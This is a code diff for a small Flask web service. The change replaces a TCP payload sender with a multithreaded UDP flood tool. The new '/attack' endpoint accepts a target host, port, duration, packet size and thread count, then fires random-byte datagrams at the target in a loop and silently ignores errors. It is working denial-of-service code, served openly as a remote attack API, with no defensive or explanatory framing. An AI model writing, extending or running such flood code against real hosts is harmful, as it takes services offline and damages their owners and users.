@@ -1,61 +1,66 @@
 from flask import Flask, request, jsonify
+from time import time as tt
 import socket
-import time
-from concurrent.futures import ThreadPoolExecutor
+import random
+import os
+import threading
 
 app = Flask(__name__)
 
-def send_packet(ip, port, packet):
+def send_packets(ip, port, duration, packet_size):
+    startup = tt()
+    while True:
+        nulled = b""
+        data = random._urandom(int(random.randint(500, 1024)))
+        data2 = random._urandom(int(random.randint(1025, 65505)))
+        data3 = os.urandom(int(random.randint(1025, 65505)))
+        data4 = random._urandom(int(random.randint(1, 65505)))
+        data5 = os.urandom(int(random.randint(1, 65505)))
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+            endtime = tt()
+            if (startup + duration) < endtime:
+                break
+
+            for _ in range(packet_size):
+                sock.sendto(nulled, (ip, port))
+                sock.sendto(data, (ip, port))
+                sock.sendto(data2, (ip, port))
+                sock.sendto(data3, (ip, port))
+                sock.sendto(data4, (ip, port))
+                sock.sendto(data5, (ip, port))
+        except:
+            pass
+        
+def attack(ip, port, duration, packet_size, threads):
+    if duration is None:
+        duration = float('inf')
+
+    if port is not None:
+        port = max(1, min(65535, port))
+
+    for _ in range(threads):
+        th = threading.Thread(target=send_packets, args=(ip, port, duration, packet_size))
+        th.start()
+
+@app.route('/attack', methods=['GET'])
+def attack_route():
+    ip = request.args.get('host')
+    port = int(request.args.get('port', 80))
+    duration = int(request.args.get('time', 60))
+    packet_size = int(request.args.get('packet_size', 1024))
+    threads = int(request.args.get('threads', 1))
+
+    if not ip:
+        return jsonify({'error': 'host parameter is required'}), 400
+
     try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-            sock.connect((ip, port))
-            sock.sendall(packet)
-            return True
+        attack(ip, port, duration, packet_size, threads)
+        return jsonify({'status': 'Attack successfully started'})
     except Exception as e:
-        return False
-
-@app.route('/send', methods=['GET'])
-def send_flood():
-    host_param = request.args.get('host', '')
-
-    try:
-        # Parse host parameter
-        ip, port, size = host_param.split(':')
-        port = int(port)
-        size = int(size)  # Size in MB
-        packet_size = size * 1024 * 1024  # Convert MB to bytes
-        packet = b'a' * packet_size  # Create the packet
-        flood_duration = 30  # Duration of the flood in seconds
-        concurrent_count = 10  # Number of concurrent sends
-
-        start_time = time.time()
-        end_time = start_time + flood_duration
-
-        # Use ThreadPoolExecutor to manage concurrent sending
-        with ThreadPoolExecutor(max_workers=concurrent_count) as executor:
-            futures = []
-            while time.time() < end_time:
-                for _ in range(concurrent_count):
-                    futures.append(executor.submit(send_packet, ip, port, packet))
-
-            # Check results of futures
-            results = [future.result() for future in futures]
-            success_count = sum(1 for result in results if result)
-
-        return jsonify({
-            'status': 'success',
-            'message': f'Sent {concurrent_count * flood_duration} packets of {size} MB to {ip}:{port}',
-            'successful_sends': success_count,
-            'failed_sends': len(futures) - success_count
-        }), 200
-
-    except ValueError:
-        return jsonify({'status': 'error', 'message': 'Invalid host parameter format. Use format: ip:port:size'}), 400
-
-    except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)}), 500
-
+        return jsonify({'error': str(e)}), 500
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
-        
